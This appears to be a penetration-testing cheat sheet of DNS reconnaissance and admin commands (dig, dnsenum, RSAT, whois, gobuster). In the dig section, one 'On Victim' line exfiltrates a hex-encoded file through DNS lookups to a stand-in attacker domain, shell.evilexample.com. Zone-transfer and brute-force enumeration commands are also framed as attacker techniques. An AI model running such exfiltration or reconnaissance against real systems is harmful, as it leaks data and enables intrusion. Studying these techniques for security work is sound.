# [dig](https://linux.die.net/man/1/dig) commands

- The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records
- A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including subdomains, IP addresses and name server records. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.

- Performs a default A record lookup for the domain. - `dig domain.com` 
- Retrieves the IPv4 address (A record) associated with the domain. - `dig domain.com A` 
- Retrieves the IPv6 address (AAAA record) associated with the domain. - `dig domain.com AAAA` 
- Finds the mail servers (MX records) responsible for the domain - `dig domain.com MX` 
- Identifies the authoritative name servers for the domain - `dig domain.com NS` 
- Retrieves any TXT records associated with the domain - `dig domain.com TXT` 
- Retrieves the canonical name (CNAME) record for the domain - `dig domain.com CNAME`
- Retrieves the start of authority (SOA) record for the domain - `dig domain.com SOA` 
- Specifies a specific name server to query; in this case 1.1.1.1 - `dig @1.1.1.1 domain.com` 
- Shows the full path of DNS resolution - `dig +trace domain.com` 
- Performs a reverse lookup on the IP address 192.168.1.1 to find the associated hostname. You may need to specify a name server - `dig -x 192.168.1.1` 
- Provides a short, concise answer to the query. - `dig +short domain.com` 
- Displays only the answer section of the query output. - `dig +noall +answer domain.com` 
- Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). - `dig domain.com ANY` 
- Reverse domain lookup - `dig -x <IP_ADDRESS>` 
- DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` (axfr is the zone transfer request)
- DNS reverse lookup (Replace first three octets of IP to set class C address to scan) - `for ip in {1..254..1}; do dig –x 1.1.1.$ip \| grep $ip >> dns.txt; done;`
- On Victim: Read in each line and do a DNS lookup - `for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`
- Lookup domain by IP - `dig -x <ip>`
- Host transfer - `dig @ <ip> <domain> it AXFR`

**Caution**: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.

# [dnsenum](https://github.com/fwaeytens/dnsenum) commands
Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains. REMINDER: Subdomains are the XYZ.google.com and directories are the google.com/XYZ
- `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

---

# [dnsrecon](https://github.com/darkoperator/dnsrecon) commands
Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats.

# Remote Server Administration Tool (RSAT)
Allows systems administrators to remotely manage Windows Server roles and features from a workstation running Windows 10, Windows 8.1, Windows 7, or Windows Vista. RSAT can only be installed on Professional or Enterprise editions of Windows. In an enterprise environment, RSAT can remotely manage Active Directory, DNS, and DHCP. RSAT also allows us to manage installed server roles and features, File Services, and Hyper-V. If installed the toolsd will be available under the Administrative Tools in the Control Panel
- Check which, if any RSAT tools are install - `Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State`
- Install all available RSAT - `Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability –Online`
- Or one at a time - `Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  –Online`


# [WHOIS](https://whoisrb.org/docs/) commands
- The `whois` command queries **WHOIS databases** to retrieve information about domain registrations, IP addresses, and network ownership. 
- Basic WHOIS Lookup `whois example.com` 
- Use grep for specifics `whois google.com \| grep "Name Server"` 
- Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) `whois -h hash.cymru.com <SUSPICIOUS FILE HASH>`
- 


# Gobuster
- Enumerate hidden directories - `gobuster dir -u http://backfire.htb:8000/ -w wordlist.txt`

